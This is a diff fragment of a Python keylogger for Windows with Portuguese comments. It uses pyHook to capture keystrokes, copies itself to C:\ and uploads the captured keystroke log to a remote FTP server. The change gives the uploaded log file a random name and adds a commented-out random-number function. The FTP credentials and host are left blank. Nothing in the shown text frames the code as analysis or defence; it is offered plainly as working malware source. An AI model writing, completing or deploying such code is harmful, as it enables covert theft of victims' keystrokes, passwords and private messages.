@@ -3,7 +3,17 @@ import pythoncom
 import ftplib, os
 import pyHook
 import shutil
+import random
 
+'''
+def num():
+   a = random.randint(0, 99999999999999)
+   y = random.randint(0, 90009999999999)
+   if a == y:
+     f = a * 2
+     a = f
+   print(a * 2) 
+'''
 
 def copy(): # Copia o Keylogger para C:\\
      try:
@@ -15,7 +25,8 @@ def copy(): # Copia o Keylogger para C:\\
            
 def ftp(): #Função para Upar o 
      try:
-          files = ("system_logs.txt") #Upa este arquivo para o servidor FTP
+          a = random.randint(0, 99999999999999)
+          files = ("system_logs" + str(a) +".txt") #Upa este arquivo para o servidor FTP
           user = "" #User do FTP
           passw = "" #Pass do FTP
           ftp = ftplib.FTP("") #Server do FTP
